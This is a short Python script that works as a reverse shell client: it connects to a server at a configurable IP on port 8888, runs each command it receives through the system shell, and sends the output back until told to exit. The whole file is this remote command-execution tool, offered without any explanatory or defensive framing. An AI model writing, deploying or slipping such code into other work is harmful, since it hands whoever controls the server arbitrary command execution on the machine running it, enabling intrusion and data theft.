import socket
import subprocess

def start_client():
    host = '127.0.0.1' # change to the servers IP 
    port = 8888

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            client_socket.send(output.encode())
        except Exception as e:
            client_socket.send(str(e).encode())

    client_socket.close()

if __name__ == "__main__":
    start_client()
